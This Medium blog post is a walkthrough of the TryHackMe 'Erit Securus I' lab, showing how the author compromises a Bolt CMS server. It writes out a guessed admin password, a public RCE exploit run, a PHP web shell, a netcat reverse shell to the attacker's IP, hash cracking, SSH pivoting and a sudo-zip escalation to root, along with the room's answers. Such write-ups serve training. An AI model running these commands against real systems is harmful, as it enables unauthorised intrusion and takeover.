---
title: "Erit Securus I TryHackme Writeup d945690ac3ad"
platform: Medium
original_file: 2024-08-30_Erit-Securus-I-TryHackme-Writeup-d945690ac3ad.md
---

# Erit Securus I TryHackme Writeup d945690ac3ad

::: {}
# Erit Securus I TryHackme Writeup {#erit-securus-i-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
Room link: https://tryhackme.com/room/eritsecurusi Note: This room is
for Premium Members Only. who purchased THM premium membership.
:::

::::::: {.section .e-content field="body"}
:::::: {#0c01 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Erit Securus I TryHackme Writeup {#ccbe .graf .graf--h3 .graf--leading .graf--title name="ccbe"}

<figure id="e62c" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*RHWwgGRYXuNLjpxb.png"
class="graf-image" data-image-id="0*RHWwgGRYXuNLjpxb.png"
data-width="509" data-height="225" />
</figure>

**Room link:**
[https://tryhackme.com/room/eritsecurusi](https://tryhackme.com/room/eritsecurusi){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/eritsecurusi"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is for Premium Members Only. who purchased THM premium
membership.**

**Difficulty level**: Easy\
**Aim**: Learn to exploit the BoltCMS software by researching
exploit-db. Capture the flags via pivoting and multiple privilege
escalation techniques.

### Information Gathering {#67ef .graf .graf--h3 .graf-after--p name="67ef"}

The target IP address is provided when the machine is deployed.

**Target:** 10.10.196.105

### Scanning {#d424 .graf .graf--h3 .graf-after--p name="d424"}

We can run a simple *nmap* scan to look for open ports and services:

``` {#a666 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
nmap -sV 10.10.196.105
```

<figure id="7318" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*6POhkiPP7QJ-7wyt.png"
class="graf-image" data-image-id="0*6POhkiPP7QJ-7wyt.png"
data-width="756" data-height="394" />
</figure>

From this we can see the following:

- [port 22/tcp --- SSH --- (OpenSSH 6.7p1)]{#ef21}
- [port 80/tcp --- HTTP --- (nginx 1.6.2)]{#7a93}

**Question 1**. How many ports are open?

> ***Answer:2***

**Question 2.** What ports are open? Comma separated, lowest first:
\*\*,\*\*

> ***Answer: 22,80***

### Enumeration {#a546 .graf .graf--h3 .graf-after--blockquote name="a546"}

The CMS that the website is built on can be found in the
***http-generator*** field of the *nmap* scan. This can also be
determined by viewing the website via the browser and scrolling to the
bottom of the page:

<figure id="109d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*wsDbJLS4dpKfFn0T.png"
class="graf-image" data-image-id="0*wsDbJLS4dpKfFn0T.png"
data-width="875" data-height="386" />
</figure>

We can use [exploit-db](https://www.exploit-db.com/){.markup--anchor
.markup--p-anchor data-href="https://www.exploit-db.com/"
rel="noopener ugc nofollow noopener" target="_blank"} to search for an
exploit for this particular CMS. The first result for an unauthenticated
RCE vulnerability (dated 2020--04--06) sounds promising:

A proof-of-concept python script can be downloaded from
[**exploit-db**](https://www.exploit-db.com/exploits/48296){.markup--anchor
.markup--p-anchor data-href="https://www.exploit-db.com/exploits/48296"
rel="noopener ugc nofollow noopener" target="_blank"} or
[**Github**](https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py){.markup--anchor
.markup--p-anchor
data-href="https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py"
rel="noopener ugc nofollow noopener" target="_blank"}.

<figure id="b716" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*9cIGlf37zx8AGryG.png"
class="graf-image" data-image-id="0*9cIGlf37zx8AGryG.png"
data-width="875" data-height="420" />
</figure>

The exploit requires authentication, which means we will require a
username and password to proceed. We could attempt to brute force this,
but these credentials can be easily guessed using a few simple
username/password combinations on the login page.

(To find the login page, simply do a Google search for '*bolt default
login*' and you'll find this within the link to the Bolt documentation)

Visit the Bolt online [user
manual](https://docs.bolt.cm/3.7/manual/login){.markup--anchor
.markup--p-anchor data-href="https://docs.bolt.cm/3.7/manual/login"
rel="noopener ugc nofollow noopener" target="_blank"} to check the
section about login. We are told that the login page can be found under
the `/bolt`{.markup--code .markup--p-code} directory.

There is no indication about default credentials. Let's take the
assumption that there is an `admin`{.markup--code .markup--p-code}
account, and we will start with some basic passwords
(`admin`{.markup--code .markup--p-code}, `password`{.markup--code
.markup--p-code}, ...). It worked with **admin:password**

**Question 1.** What CMS is the website built on?

> ***Answer: bolt***

### Gaining Access {#a5e4 .graf .graf--h3 .graf-after--blockquote name="a5e4"}

We are now ready to run the exploit script against the target:

``` {#7ca1 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="cpp"}
python3 exploit.py http://10.10.116.95 admin password
```

<figure id="1335" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*FP-2LTf9vFIHh-3k.png"
class="graf-image" data-image-id="0*FP-2LTf9vFIHh-3k.png"
data-width="875" data-height="506" />
</figure>

Now we have access, we can create a simple PHP shell on the server:

``` {#69aa .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="php-template"}
echo '<?php system($_GET["cmd"]);?>'>cmd.php
```

<figure id="bf15" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*HK9ivGgssH-52PY8.png"
class="graf-image" data-image-id="0*HK9ivGgssH-52PY8.png"
data-width="875" data-height="180" />
</figure>

This can then be used to upload a *netcat* reverse shell (as there is no
*netcat* on the target machine). First, we will need to create a
symbolic link to *netcat* on our local machine to the current directory
on the target. Run this command via a local terminal:

``` {#f470 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
ln -s $(which nc) .
```

A simple web server can then be started locally in order to serve the
file to the target:

``` {#416e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
python -m SimpleHTTPServer 80
```

<figure id="2f44" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*sAszWpLnpVEw3Kig.png"
class="graf-image" data-image-id="0*sAszWpLnpVEw3Kig.png"
data-width="619" data-height="263" />
</figure>

Using the PHP shell we are able to download *netcat* to the target via
the browser:

<figure id="b755" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*rpq3oSBW95pCsjxU.png"
class="graf-image" data-image-id="0*rpq3oSBW95pCsjxU.png"
data-width="759" data-height="313" />
</figure>

``` {#6c5c .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
http://10.10.196.105/files/cmd.php?cmd=chmod 755 nc
```

Next we need to start a *netcat* listener on our local machine

``` {#57a2 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
nc -nlvp 1234
```

Finally, we can trigger this connection via the browser to get our
reverse shell:

``` {#e300 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
http://10.10.196.105/files/cmd.php?cmd=./nc -e /bin/bash 10.2.12.26.1234
```

<figure id="bdfa" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*qegcjjOmt3hfEEOs.png"
class="graf-image" data-image-id="0*qegcjjOmt3hfEEOs.png"
data-width="600" data-height="73" />
</figure>

<figure id="0066" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*tx23YzTiZo_7Zk-U.png"
class="graf-image" data-image-id="0*tx23YzTiZo_7Zk-U.png"
data-width="822" data-height="334" />
</figure>

Our reverse shell can then be upgraded to a fully interactive TTY shell
by running:

``` {#f2bf .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
python -c 'import pty;pty.spawn("/bin/bash")'
```

<figure id="7530" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*GHAo8HMqDq1e1Ks1.png"
class="graf-image" data-image-id="0*GHAo8HMqDq1e1Ks1.png"
data-width="628" data-height="332" />
</figure>

**Question 1.** What is the username of the user running the web server?

> ***Answer: www-data***

### Privilege Escalation {#68f0 .graf .graf--h3 .graf-after--blockquote name="68f0"}

In the **/app/database** directory you will find the database file:
***bolt.db***

<figure id="f0e8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ggaLzgdxeH2pr1GA.png"
class="graf-image" data-image-id="0*ggaLzgdxeH2pr1GA.png"
data-width="732" data-height="211" />
</figure>

We can access this SQLite 3.x database and run the *.tables* command to
display the database tables:

<figure id="6713" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*HcOtDaCNFIrA3mrI.png"
class="graf-image" data-image-id="0*HcOtDaCNFIrA3mrI.png"
data-width="683" data-height="277" />
</figure>

The *bolt_users* table looks interesting, let's have a look at that:

``` {#9a07 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SELECT * FROM bolt_users;
```

<figure id="4bfc" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Az5pV_aGRM7QKTUy.png"
class="graf-image" data-image-id="0*Az5pV_aGRM7QKTUy.png"
data-width="875" data-height="101" />
</figure>

Two users are listed --- *admin* and *wildone* (Wile E Coyote). There is
also an IP address of *192.168.100.1*, which might come in handy later.

We're already *admin*, so let's try and crack the hash of *wildone*
using JohnTheRipper and the rockyou wordlist.

First, copy the hash to a file and then run:

``` {#2f1c .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
john hash.txt -w=/usr/share/wordlists/rockyou.txt
```

<figure id="9529" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*vrhXuEyCSo956tDd.png"
class="graf-image" data-image-id="0*vrhXuEyCSo956tDd.png"
data-width="554" data-height="247" />
</figure>

This allows us to switch user to *wileec* and obtain the first flag:

<figure id="72b4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*cca5DsQd7PSCICBf.png"
class="graf-image" data-image-id="0*cca5DsQd7PSCICBf.png"
data-width="556" data-height="177" />
</figure>

<figure id="869d" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Bkgjpj8PiLIS2gpE.png"
class="graf-image" data-image-id="0*Bkgjpj8PiLIS2gpE.png"
data-width="529" data-height="552" />
</figure>

### Pivoting {#f61a .graf .graf--h3 .graf-after--figure name="f61a"}

It appears that *wileec* also has an ssh private key:

<figure id="d033" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*vv8pc728mbDTXSyz.png"
class="graf-image" data-image-id="0*vv8pc728mbDTXSyz.png"
data-width="609" data-height="421" />
</figure>

We can use this to try connecting using the internal IP address we found
in the *bolt_users* table of the SQLite database:

<figure id="eb5e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*THTexPHoMqSCHOM3.png"
class="graf-image" data-image-id="0*THTexPHoMqSCHOM3.png"
data-width="663" data-height="247" />
</figure>

Great, it worked... and, even better, we have some *sudo* privileges:

<figure id="33a8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*hecLFSh2mJ4CxUNY.png"
class="graf-image" data-image-id="0*hecLFSh2mJ4CxUNY.png"
data-width="858" data-height="212" />
</figure>

**Question 1.** User wileec can sudo! What can he sudo?

> ***Answer: (jsmith) NOPASSWD: /usr/bin/zip***

### Privilege Escalation #2 {#cc46 .graf .graf--h3 .graf-after--blockquote name="cc46"}

We can use the */usr/bin/zip* binary to elevate our privileges once
again to become user *jsmith*:

``` {#619d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
TF=$(mktemp -u)
sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
```

<figure id="3119" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*BGYpQ-c_n1Sk-xxU.png"
class="graf-image" data-image-id="0*BGYpQ-c_n1Sk-xxU.png"
data-width="563" data-height="208" />
</figure>

Awesome! We are now *jsmith*.

Once again, we can upgrade to a fully interactive shell:

``` {#e0cb .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
python -c 'import pty;pty.spawn("/bin/bash")'
```

Next, we can change to the users home directory and grab the second
flag:

<figure id="90bb" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*_YB5EIOPoZFrlAWz.png"
class="graf-image" data-image-id="0*_YB5EIOPoZFrlAWz.png"
data-width="517" data-height="262" />
</figure>

Taking a look at the *sudo* privileges for *jsmith* we can see that this
user can literally run any command without a password! From here, we can
simply switch to this user, change to the */root* directory and grab the
final flag:

<figure id="69a6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*6ZVHazJFrp0bSheJ.png"
class="graf-image" data-image-id="0*6ZVHazJFrp0bSheJ.png"
data-width="705" data-height="348" />
</figure>

**Question 1.** What sudo rights does jsmith have?

> ***Answer: ALL : ALL NOPASSWD: ALL***

### Promote and Collaborate on Cybersecurity Insights {#4643 .graf .graf--h3 .graf-after--blockquote name="4643"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#980e .graf .graf--h3 .graf-after--p name="980e"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 30, 2024](https://medium.com/p/d945690ac3ad).

[Canonical
link](https://medium.com/@bevijaygupta/erit-securus-i-tryhackme-writeup-d945690ac3ad){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
